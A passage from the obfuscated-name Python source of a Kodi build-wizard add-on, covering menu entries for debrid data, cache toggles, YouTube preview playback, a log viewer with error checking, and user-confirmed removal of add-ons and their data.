		OO00O000O0OO0O000 .append ((THEME3 %'Restore %s Data'%O0O00O00OO0OOO0O0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO0000OO0O0OOO0O0 ,O00OO00OOO0OOOOO0 )))#line:4141
		OO00O000O0OO0O000 .append ((THEME3 %'Clear %s Data'%O0O00O00OO0OOO0O0 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OO0000OO0O0OOO0O0 ,O00OO00OOO0OOOOO0 )))#line:4142
	elif OO000O00000OO0O00 =='save':#line:4143
		OO00O000O0OO0O000 =[]#line:4144
		OO0000OO0O0OOO0O0 =urllib .quote_plus (OOOO00O0000OOO000 .lower ().replace (' ',''))#line:4145
		O0O00O00OO0OOO0O0 =OOOO00O0000OOO000 .replace ('Debrid','Real Debrid')#line:4146
		O00OO00OOO0OOOOO0 =urllib .quote_plus (O00000OOOOO0OO0O0 .lower ().replace (' ',''))#line:4147
		O00000OOOOO0OO0O0 =O00000OOOOO0OO0O0 .replace ('url','URL Resolver')#line:4148
		OO00O000O0OO0O000 .append ((THEME2 %O00000OOOOO0OO0O0 .title (),' '))#line:4149
		OO00O000O0OO0O000 .append ((THEME3 %'Register %s'%O0O00O00OO0OOO0O0 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OO0000OO0O0OOO0O0 ,O00OO00OOO0OOOOO0 )))#line:4150
		OO00O000O0OO0O000 .append ((THEME3 %'Save %s Data'%O0O00O00OO0OOO0O0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO0000OO0O0OOO0O0 ,O00OO00OOO0OOOOO0 )))#line:4151
		OO00O000O0OO0O000 .append ((THEME3 %'Restore %s Data'%O0O00O00OO0OOO0O0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO0000OO0O0OOO0O0 ,O00OO00OOO0OOOOO0 )))#line:4152
		OO00O000O0OO0O000 .append ((THEME3 %'Import %s Data'%O0O00O00OO0OOO0O0 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OO0000OO0O0OOO0O0 ,O00OO00OOO0OOOOO0 )))#line:4153
		OO00O000O0OO0O000 .append ((THEME3 %'Clear Addon %s Data'%O0O00O00OO0OOO0O0 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OO0000OO0O0OOO0O0 ,O00OO00OOO0OOOOO0 )))#line:4154
	elif OO000O00000OO0O00 =='install':#line:4155
		OO00O000O0OO0O000 =[]#line:4156
		O00OO00OOO0OOOOO0 =urllib .quote_plus (O00000OOOOO0OO0O0 )#line:4157
		OO00O000O0OO0O000 .append ((THEME2 %O00000OOOOO0OO0O0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O00OO00OOO0OOOOO0 )))#line:4158
		OO00O000O0OO0O000 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O00OO00OOO0OOOOO0 )))#line:4159
		OO00O000O0OO0O000 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O00OO00OOO0OOOOO0 )))#line:4160
		OO00O000O0OO0O000 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O00OO00OOO0OOOOO0 )))#line:4161
		OO00O000O0OO0O000 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O00OO00OOO0OOOOO0 )))#line:4162
	OO00O000O0OO0O000 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4163
	return OO00O000O0OO0O000 #line:4164
def toggleCache (O000O0O000O00O0O0 ):#line:4166
	O0O000O0OOOO0O000 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4167
	OOO0OO0O00O0OO00O =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4168
	if O000O0O000O00O0O0 in ['true','false']:#line:4169
		for O0O0O0O00OO000O0O in O0O000O0OOOO0O000 :#line:4170
			wiz .setS (O0O0O0O00OO000O0O ,O000O0O000O00O0O0 )#line:4171
	else :#line:4172
		if not O000O0O000O00O0O0 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4173
			try :#line:4174
				O0O0O0O00OO000O0O =OOO0OO0O00O0OO00O [O0O000O0OOOO0O000 .index (O000O0O000O00O0O0 )]#line:4175
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O0O0O0O00OO000O0O ))#line:4176
			except :#line:4177
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O000O0O000O00O0O0 ))#line:4178
		else :#line:4179
			O0O000OOO00000OOO ='true'if wiz .getS (O000O0O000O00O0O0 )=='false'else 'false'#line:4180
			wiz .setS (O000O0O000O00O0O0 ,O0O000OOO00000OOO )#line:4181
def playVideo (OO00O00000O0OOOO0 ):#line:4183
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OO00O00000O0OOOO0 )#line:4184
	if 'watch?v='in OO00O00000O0OOOO0 :#line:4185
		OOO0OOO00O0OOOOOO ,O00OO000O0O00O0O0 =OO00O00000O0OOOO0 .split ('?')#line:4186
		O0000OO0O000OO0OO =O00OO000O0O00O0O0 .split ('&')#line:4187
		for OO00O0O00OO0OOO00 in O0000OO0O000OO0OO :#line:4188
			if OO00O0O00OO0OOO00 .startswith ('v='):#line:4189
				OO00O00000O0OOOO0 =OO00O0O00OO0OOO00 [2 :]#line:4190
				break #line:4191
			else :continue #line:4192
	elif 'embed'in OO00O00000O0OOOO0 or 'youtu.be'in OO00O00000O0OOOO0 :#line:4193
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OO00O00000O0OOOO0 )#line:4194
		OOO0OOO00O0OOOOOO =OO00O00000O0OOOO0 .split ('/')#line:4195
		if len (OOO0OOO00O0OOOOOO [-1 ])>5 :#line:4196
			OO00O00000O0OOOO0 =OOO0OOO00O0OOOOOO [-1 ]#line:4197
		elif len (OOO0OOO00O0OOOOOO [-2 ])>5 :#line:4198
			OO00O00000O0OOOO0 =OOO0OOO00O0OOOOOO [-2 ]#line:4199
	wiz .log ("YouTube URL: %s"%OO00O00000O0OOOO0 )#line:4200
	yt .PlayVideo (OO00O00000O0OOOO0 )#line:4201
def viewLogFile ():#line:4203
	OO0O0O000O000OOOO =wiz .Grab_Log (True )#line:4204
	O0OO00OOO0O0OOO0O =wiz .Grab_Log (True ,True )#line:4205
	OO0O0O0000OO0OOOO =0 ;OO00O000O000O000O =OO0O0O000O000OOOO #line:4206
	if not O0OO00OOO0O0OOO0O ==False and not OO0O0O000O000OOOO ==False :#line:4207
		OO0O0O0000OO0OOOO =DIALOG .select (ADDONTITLE ,["View %s"%OO0O0O000O000OOOO .replace (LOG ,""),"View %s"%O0OO00OOO0O0OOO0O .replace (LOG ,"")])#line:4208
		if OO0O0O0000OO0OOOO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4209
	elif OO0O0O000O000OOOO ==False and O0OO00OOO0O0OOO0O ==False :#line:4210
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4211
		return #line:4212
	elif not OO0O0O000O000OOOO ==False :OO0O0O0000OO0OOOO =0 #line:4213
	elif not O0OO00OOO0O0OOO0O ==False :OO0O0O0000OO0OOOO =1 #line:4214
	OO00O000O000O000O =OO0O0O000O000OOOO if OO0O0O0000OO0OOOO ==0 else O0OO00OOO0O0OOO0O #line:4216
	O0000000000OO0O00 =wiz .Grab_Log (False )if OO0O0O0000OO0OOOO ==0 else wiz .Grab_Log (False ,True )#line:4217
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OO00O000O000O000O ),O0000000000OO0O00 )#line:4219
def errorChecking (log =None ,count =None ,all =None ):#line:4221
	if log ==None :#line:4222
		OO00O0000000OO00O =wiz .Grab_Log (True )#line:4223
		OO00O0OOOOOOOOO0O =wiz .Grab_Log (True ,True )#line:4224
		if not OO00O0OOOOOOOOO0O ==False and not OO00O0000000OO00O ==False :#line:4225
			OOOOOOOO0OOOOO000 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OO00O0000000OO00O .replace (LOG ,""),errorChecking (OO00O0000000OO00O ,True ,True )),"View %s: %s error(s)"%(OO00O0OOOOOOOOO0O .replace (LOG ,""),errorChecking (OO00O0OOOOOOOOO0O ,True ,True ))])#line:4226
			if OOOOOOOO0OOOOO000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4227
		elif OO00O0000000OO00O ==False and OO00O0OOOOOOOOO0O ==False :#line:4228
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4229
			return #line:4230
		elif not OO00O0000000OO00O ==False :OOOOOOOO0OOOOO000 =0 #line:4231
		elif not OO00O0OOOOOOOOO0O ==False :OOOOOOOO0OOOOO000 =1 #line:4232
		log =OO00O0000000OO00O if OOOOOOOO0OOOOO000 ==0 else OO00O0OOOOOOOOO0O #line:4233
	if log ==False :#line:4234
		if count ==None :#line:4235
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4236
			return False #line:4237
		else :#line:4238
			return 0 #line:4239
	else :#line:4240
		if os .path .exists (log ):#line:4241
			O000O000OO000OOOO =open (log ,mode ='r');O0OOO0O00OO0O0OO0 =O000O000OO000OOOO .read ().replace ('\n','').replace ('\r','');O000O000OO000OOOO .close ()#line:4242
			OO0O000O00O0000OO =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O0OOO0O00OO0O0OO0 )#line:4243
			if not count ==None :#line:4244
				if all ==None :#line:4245
					O0O00OOOO00OOOOO0 =0 #line:4246
					for O0OO0O0OO0OO0O000 in OO0O000O00O0000OO :#line:4247
						if ADDON_ID in O0OO0O0OO0OO0O000 :O0O00OOOO00OOOOO0 +=1 #line:4248
					return O0O00OOOO00OOOOO0 #line:4249
				else :return len (OO0O000O00O0000OO )#line:4250
			if len (OO0O000O00O0000OO )>0 :#line:4251
				O0O00OOOO00OOOOO0 =0 ;OO0O0O000OO0000OO =""#line:4252
				for O0OO0O0OO0OO0O000 in OO0O000O00O0000OO :#line:4253
					if all ==None and not ADDON_ID in O0OO0O0OO0OO0O000 :continue #line:4254
					else :#line:4255
						O0O00OOOO00OOOOO0 +=1 #line:4256
						OO0O0O000OO0000OO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0O00OOOO00OOOOO0 ,O0OO0O0OO0OO0O000 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4257
				if O0O00OOOO00OOOOO0 >0 :#line:4258
					wiz .TextBox (ADDONTITLE ,OO0O0O000OO0000OO )#line:4259
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4260
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4261
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4262
ACTION_PREVIOUS_MENU =10 #line:4264
ACTION_NAV_BACK =92 #line:4265
ACTION_MOVE_LEFT =1 #line:4266
ACTION_MOVE_RIGHT =2 #line:4267
ACTION_MOVE_UP =3 #line:4268
ACTION_MOVE_DOWN =4 #line:4269
ACTION_MOUSE_WHEEL_UP =104 #line:4270
ACTION_MOUSE_WHEEL_DOWN =105 #line:4271
ACTION_MOVE_MOUSE =107 #line:4272
ACTION_SELECT_ITEM =7 #line:4273
ACTION_BACKSPACE =110 #line:4274
ACTION_MOUSE_LEFT_CLICK =100 #line:4275
ACTION_MOUSE_LONG_CLICK =108 #line:4276
def LogViewer (default =None ):#line:4278
	class O0O0O00000O0O0OOO (xbmcgui .WindowXMLDialog ):#line:4279
		def __init__ (O0O0OOO0O00OOO0O0 ,*OOOOO00OOOO0OO00O ,**O0OOOOO0OO00O00O0 ):#line:4280
			O0O0OOO0O00OOO0O0 .default =O0OOOOO0OO00O00O0 ['default']#line:4281
		def onInit (OOO00O0OO0O00000O ):#line:4283
			OOO00O0OO0O00000O .title =101 #line:4284
			OOO00O0OO0O00000O .msg =102 #line:4285
			OOO00O0OO0O00000O .scrollbar =103 #line:4286
			OOO00O0OO0O00000O .upload =201 #line:4287
			OOO00O0OO0O00000O .kodi =202 #line:4288
			OOO00O0OO0O00000O .kodiold =203 #line:4289
			OOO00O0OO0O00000O .wizard =204 #line:4290
			OOO00O0OO0O00000O .okbutton =205 #line:4291
			OOO00O00O000000O0 =open (OOO00O0OO0O00000O .default ,'r')#line:4292
			OOO00O0OO0O00000O .logmsg =OOO00O00O000000O0 .read ()#line:4293
			OOO00O00O000000O0 .close ()#line:4294
			OOO00O0OO0O00000O .titlemsg ="%s: %s"%(ADDONTITLE ,OOO00O0OO0O00000O .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4295
			OOO00O0OO0O00000O .showdialog ()#line:4296
		def showdialog (OOOO0OOO0O0OOO00O ):#line:4298
			OOOO0OOO0O0OOO00O .getControl (OOOO0OOO0O0OOO00O .title ).setLabel (OOOO0OOO0O0OOO00O .titlemsg )#line:4299
			OOOO0OOO0O0OOO00O .getControl (OOOO0OOO0O0OOO00O .msg ).setText (wiz .highlightText (OOOO0OOO0O0OOO00O .logmsg ))#line:4300
			OOOO0OOO0O0OOO00O .setFocusId (OOOO0OOO0O0OOO00O .scrollbar )#line:4301
		def onClick (O0OO000000O0OOOOO ,O0O000O000O0000O0 ):#line:4303
			if O0O000O000O0000O0 ==O0OO000000O0OOOOO .okbutton :O0OO000000O0OOOOO .close ()#line:4304
			elif O0O000O000O0000O0 ==O0OO000000O0OOOOO .upload :O0OO000000O0OOOOO .close ();uploadLog .Main ()#line:4305
			elif O0O000O000O0000O0 ==O0OO000000O0OOOOO .kodi :#line:4306
				OOOO000OO00O0OO0O =wiz .Grab_Log (False )#line:4307
				OO0OOOO00O0O00OOO =wiz .Grab_Log (True )#line:4308
				if OOOO000OO00O0OO0O ==False :#line:4309
					O0OO000000O0OOOOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4310
					O0OO000000O0OOOOO .getControl (O0OO000000O0OOOOO .msg ).setText ("Log File Does Not Exists!")#line:4311
				else :#line:4312
					O0OO000000O0OOOOO .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OOOO00O0O00OOO .replace (LOG ,''))#line:4313
					O0OO000000O0OOOOO .getControl (O0OO000000O0OOOOO .title ).setLabel (O0OO000000O0OOOOO .titlemsg )#line:4314
					O0OO000000O0OOOOO .getControl (O0OO000000O0OOOOO .msg ).setText (wiz .highlightText (OOOO000OO00O0OO0O ))#line:4315
					O0OO000000O0OOOOO .setFocusId (O0OO000000O0OOOOO .scrollbar )#line:4316
			elif O0O000O000O0000O0 ==O0OO000000O0OOOOO .kodiold :#line:4317
				OOOO000OO00O0OO0O =wiz .Grab_Log (False ,True )#line:4318
				OO0OOOO00O0O00OOO =wiz .Grab_Log (True ,True )#line:4319
				if OOOO000OO00O0OO0O ==False :#line:4320
					O0OO000000O0OOOOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4321
					O0OO000000O0OOOOO .getControl (O0OO000000O0OOOOO .msg ).setText ("Log File Does Not Exists!")#line:4322
				else :#line:4323
					O0OO000000O0OOOOO .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OOOO00O0O00OOO .replace (LOG ,''))#line:4324
					O0OO000000O0OOOOO .getControl (O0OO000000O0OOOOO .title ).setLabel (O0OO000000O0OOOOO .titlemsg )#line:4325
					O0OO000000O0OOOOO .getControl (O0OO000000O0OOOOO .msg ).setText (wiz .highlightText (OOOO000OO00O0OO0O ))#line:4326
					O0OO000000O0OOOOO .setFocusId (O0OO000000O0OOOOO .scrollbar )#line:4327
			elif O0O000O000O0000O0 ==O0OO000000O0OOOOO .wizard :#line:4328
				OOOO000OO00O0OO0O =wiz .Grab_Log (False ,False ,True )#line:4329
				OO0OOOO00O0O00OOO =wiz .Grab_Log (True ,False ,True )#line:4330
				if OOOO000OO00O0OO0O ==False :#line:4331
					O0OO000000O0OOOOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4332
					O0OO000000O0OOOOO .getControl (O0OO000000O0OOOOO .msg ).setText ("Log File Does Not Exists!")#line:4333
				else :#line:4334
					O0OO000000O0OOOOO .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OOOO00O0O00OOO .replace (ADDONDATA ,''))#line:4335
					O0OO000000O0OOOOO .getControl (O0OO000000O0OOOOO .title ).setLabel (O0OO000000O0OOOOO .titlemsg )#line:4336
					O0OO000000O0OOOOO .getControl (O0OO000000O0OOOOO .msg ).setText (wiz .highlightText (OOOO000OO00O0OO0O ))#line:4337
					O0OO000000O0OOOOO .setFocusId (O0OO000000O0OOOOO .scrollbar )#line:4338
		def onAction (OOO0O000O00O0OOOO ,OOO0O00000O000000 ):#line:4340
			if OOO0O00000O000000 ==ACTION_PREVIOUS_MENU :OOO0O000O00O0OOOO .close ()#line:4341
			elif OOO0O00000O000000 ==ACTION_NAV_BACK :OOO0O000O00O0OOOO .close ()#line:4342
	if default ==None :default =wiz .Grab_Log (True )#line:4343
	O000OOO0OO00O0000 =O0O0O00000O0O0OOO ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4344
	O000OOO0OO00O0000 .doModal ()#line:4345
	del O000OOO0OO00O0000 #line:4346
def removeAddon (OO0O0O0OOOO000OOO ,O0OOO0O0000O00O00 ,over =False ):#line:4348
	if not over ==False :#line:4349
		O0OOO0O0O0OO00OO0 =1 #line:4350
	else :#line:4351
		O0OOO0O0O0OO00OO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OOO0O0000O00O00 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OO0O0O0OOOO000OOO ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4352
	if O0OOO0O0O0OO00OO0 ==1 :#line:4353
		OOOO0O000OOO0000O =os .path .join (ADDONS ,OO0O0O0OOOO000OOO )#line:4354
		wiz .log ("Removing Addon %s"%OO0O0O0OOOO000OOO )#line:4355
		wiz .cleanHouse (OOOO0O000OOO0000O )#line:4356
		xbmc .sleep (1000 )#line:4357
		try :shutil .rmtree (OOOO0O000OOO0000O )#line:4358
		except Exception as OOOOOO000OOOO0O00 :wiz .log ("Error removing %s"%OO0O0O0OOOO000OOO ,xbmc .LOGNOTICE )#line:4359
		removeAddonData (OO0O0O0OOOO000OOO ,O0OOO0O0000O00O00 ,over )#line:4360
	if over ==False :#line:4361
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O0OOO0O0000O00O00 ))#line:4362
def removeAddonData (OO0O000O000O00O0O ,name =None ,over =False ):#line:4364
	if OO0O000O000O00O0O =='all':#line:4365
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4366
			wiz .cleanHouse (ADDOND )#line:4367
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4368
	elif OO0O000O000O00O0O =='uninstalled':#line:4369
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4370
			O000000OO00OO0O00 =0 #line:4371
			for OOOO0OOOO00O0000O in glob .glob (os .path .join (ADDOND ,'*')):#line:4372
				O0000O0O000O0O0O0 =OOOO0OOOO00O0000O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4373
				if O0000O0O000O0O0O0 in EXCLUDES :pass #line:4374
				elif os .path .exists (os .path .join (ADDONS ,O0000O0O000O0O0O0 )):pass #line:4375
				else :wiz .cleanHouse (OOOO0OOOO00O0000O );O000000OO00OO0O00 +=1 ;wiz .log (OOOO0OOOO00O0000O );shutil .rmtree (OOOO0OOOO00O0000O )#line:4376
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O000000OO00OO0O00 ))#line:4377
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4378
	elif OO0O000O000O00O0O =='empty':#line:4379
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4380
			O000000OO00OO0O00 =wiz .emptyfolder (ADDOND )#line:4381
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O000000OO00OO0O00 ))#line:4382
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4383
	else :#line:4384
		O0OOOOOO0O000OOOO =os .path .join (USERDATA ,'addon_data',OO0O000O000O00O0O )#line:4385
		if OO0O000O000O00O0O in EXCLUDES :#line:4386
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4387
		elif os .path .exists (O0OOOOOO0O000OOOO ):#line:4388
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O000O000O00O0O ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4389
				wiz .cleanHouse (O0OOOOOO0O000OOOO )#line:4390
				try :#line:4391
					shutil .rmtree (O0OOOOOO0O000OOOO )#line:4392
				except :#line:4393
					wiz .log ("Error deleting: %s"%O0OOOOOO0O000OOOO )#line:4394
			else :#line:4395
				wiz .log ('Addon data for %s was not removed'%OO0O000O000O00O0O )#line:4396
	wiz .refresh ()#line:4397
def restoreit (OOOO0OOOO0OOO0O00 ):#line:4399
	if OOOO0OOOO0OOO0O00 =='build':#line:4400
		OO0000O000OOO000O =freshStart ('restore')#line:4401
		if OO0000O000OOO000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4402
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4403
		wiz .skinToDefault ()#line:4404
	wiz .restoreLocal (OOOO0OOOO0OOO0O00 )#line:4405
def restoreextit (OO0O0OO0O0OOOOOOO ):#line:4407
	if OO0O0OO0O0OOOOOOO =='build':#line:4408
		OO00O0O0O0OOO0000 =freshStart ('restore')#line:4409
		if OO00O0O0O0OOO0000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4410
	wiz .restoreExternal (OO0O0OO0O0OOOOOOO )#line:4411
def buildInfo (OOO00O00OOO000OOO ):#line:4413
	if wiz .workingURL (SPEEDFILE )==True :#line:4414
		if wiz .checkBuild (OOO00O00OOO000OOO ,'url'):#line:4415
			OOO00O00OOO000OOO ,O0OOOO000OOOOOOOO ,OO0OO0OOO000O000O ,OOOO00O000O0OOOOO ,O0OO0OO0O0O0000O0 ,O0OO0OOOOO0OO00O0 ,O0O0000O00O0O00O0 ,O0O0OO0OO0000OO0O ,O0O000O00OO00O000 ,OO000O00OO00OOO0O ,O0OOO00O00O00000O =wiz .checkBuild (OOO00O00OOO000OOO ,'all')#line:4416
			OO000O00OO00OOO0O ='Yes'if OO000O00OO00OOO0O .lower ()=='yes'else 'No'#line:4417
			O00O0O000OO00000O ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO00O00OOO000OOO )#line:4418
			O00O0O000OO00000O +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOOO000OOOOOOOO )#line:4419
			if not O0OO0OOOOO0OO00O0 =="http://":#line:4420
				OOOOOOOO000OOOO0O =wiz .themeCount (OOO00O00OOO000OOO ,False )#line:4421
				O00O0O000OO00000O +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OOOOOOOO000OOOO0O ))#line:4422
			O00O0O000OO00000O +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO0OO0O0O0000O0 )#line:4423
			O00O0O000OO00000O +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO000O00OO00OOO0O )#line:4424
			O00O0O000OO00000O +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOO00O00O00000O )#line:4425
			wiz .TextBox (ADDONTITLE ,O00O0O000OO00000O )#line:4426
		else :wiz .log ("Invalid Build Name!")#line:4427
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4428
def buildVideo (O0000O00OO0OOOOO0 ):#line:4430
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4431
	if wiz .workingURL (SPEEDFILE )==True :#line:4432
		OOOO0O00OOO00O0O0 =wiz .checkBuild (O0000O00OO0OOOOO0 ,'preview')#line:4433
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O0000O00OO0OOOOO0 )#line:4434
		if OOOO0O00OOO00O0O0 and not OOOO0O00OOO00O0O0 =='http://':playVideo (OOOO0O00OOO00O0O0 )#line:4435
		else :wiz .log ("[%s]Unable to find url for video preview"%O0000O00OO0OOOOO0 )#line:4436
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4437
def dependsList (OO0O000OOO00OO00O ):#line:4439
	O0O0000OOO0O00O00 =os .path .join (ADDONS ,OO0O000OOO00OO00O ,'addon.xml')#line:4440
	if os .path .exists (O0O0000OOO0O00O00 ):#line:4441
		OOOOOOO0O0OOOO000 =open (O0O0000OOO0O00O00 ,mode ='r');OO0OO0OOOO0OO0O00 =OOOOOOO0O0OOOO000 .read ();OOOOOOO0O0OOOO000 .close ();#line:4442
		OO0OO0O000O0OOO00 =wiz .parseDOM (OO0OO0OOOO0OO0O00 ,'import',ret ='addon')#line:4443
		OO0OO0OOO0O0OOOOO =[]#line:4444
		for O0O0OO00O00OO00OO in OO0OO0O000O0OOO00 :#line:4445
			if not 'xbmc.python'in O0O0OO00O00OO00OO :#line:4446
				OO0OO0OOO0O0OOOOO .append (O0O0OO00O00OO00OO )#line:4447
		return OO0OO0OOO0O0OOOOO #line:4448
	return []#line:4449
def manageSaveData (O0O000OO0OOO0O000 ):#line:4451
	if O0O000OO0OOO0O000 =='import':#line:4452
		OOOOOO0O0OO00000O =os .path .join (ADDONDATA ,'temp')#line:4453
		if not os .path .exists (OOOOOO0O0OO00000O ):os .makedirs (OOOOOO0O0OO00000O )#line:4454
		OO00O0OO0000O0OO0 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4455
		if not OO00O0OO0000O0OO0 .endswith ('.zip'):#line:4456
